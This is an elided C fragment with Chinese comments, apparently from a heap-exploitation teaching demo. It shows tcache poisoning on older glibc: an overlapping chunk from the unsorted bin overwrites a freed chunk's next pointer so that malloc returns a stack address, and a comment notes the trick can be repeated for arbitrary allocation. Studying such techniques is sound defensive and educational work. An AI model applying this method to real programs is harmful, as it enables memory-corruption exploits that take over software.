...
int main()
{
    ...
    // 从 unsorted 取重叠块 b，通过它覆盖内部 victim 的 next，执行低版本 tcache poisoning。
    intptr_t *b = malloc(0x120);
    b[0x120/8-2] = (long)stack_var;
    
    // 连续两次同尺寸申请：先取 victim，再沿被覆盖的 next 取得栈上 target。
    malloc(0x100);
    intptr_t *c = malloc(0x100);

    // 严格断言返回地址等于 stack_var，证明 poisoning 成功。
    assert(c==stack_var);
    
    // 重叠关系仍保留时可重复释放 victim、改写 next，从而多次获得任意分配。
